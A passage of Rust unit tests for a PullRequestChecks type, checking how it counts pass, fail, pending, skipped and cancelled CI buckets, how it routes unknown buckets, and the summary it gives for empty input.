            "pass", "pass", "fail", "pending", "skipping", "cancel",
        ]);
        assert_eq!(checks.total(), 6);
        assert_eq!(checks.passing(), 2);
        assert_eq!(checks.failing(), 1);
        assert_eq!(checks.pending(), 1);
        assert_eq!(checks.skipped(), 1);
        assert_eq!(checks.cancelled(), 1);
    }

    #[test]
    fn pull_request_checks_from_buckets_routes_unknown_into_skipped() {
        let checks = PullRequestChecks::from_buckets(["pass", "unknown-bucket", "another-bucket"]);
        assert_eq!(checks.total(), 3);
        assert_eq!(checks.passing(), 1);
        assert_eq!(checks.skipped(), 2, "unknown buckets fall into skipped");
        assert_eq!(
            checks.passing()
                + checks.failing()
                + checks.pending()
                + checks.skipped()
                + checks.cancelled(),
            checks.total(),
            "counters must always sum to total"
        );
    }

    #[test]
    fn pull_request_checks_from_buckets_empty_yields_zero_total() {
        let checks = PullRequestChecks::from_buckets(std::iter::empty::<&str>());
        assert_eq!(checks.total(), 0);
        assert_eq!(checks.summary(), "(none)");
    }
}
